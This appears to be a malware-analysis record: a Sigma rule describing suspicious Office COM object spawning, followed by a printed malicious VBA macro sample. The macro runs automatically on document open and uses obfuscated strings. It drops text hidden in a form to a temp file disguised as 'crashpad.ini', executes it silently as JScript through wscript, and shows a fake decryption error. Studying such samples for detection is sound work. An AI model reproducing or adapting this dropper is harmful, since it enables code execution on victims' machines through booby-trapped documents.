sigma_analysis_results.rule_title: Suspicious New Instance Of An Office COM Object
sigma_analysis_results.rule_description:
Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc.
This can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)

Sub armando()
    Dim oduvu
    Dim lginby
    Dim vbslginby
    Dim indywa
    Dim mdifko
    Dim alnumvoh
    Dim ucagisw
    Dim yminqodh
    Dim gufuj
    Set isapwyw = CreateObject("Scripting.FileSystemObject")
    yminqodh = "ini.daphsarc\"
    Set etirusl = isapwyw.GetSpecialFolder(2)
    oduvu = etirusl & StrReverse(yminqodh)
    vbslginby = UserForm1.TextBox1.Text
    vbslginby = Replace(vbslginby, "!!!", " ")
    Set ufada = isapwyw.OpenTextFile(oduvu, 2, True)
    For Each one In Split(vbslginby, "|*|")
    ufada.WriteLine one
    Next one
    ufada.Close
    indywa = "//b /e:j"
    mdifko = "pt.e"
    gufuj = "wscri" & mdifko & "xe " & indywa & "script " & oduvu
    Shell gufuj, False
    MsgBox "Decryption error!"
End Sub
Sub AutoOpen()
    armando
End Sub
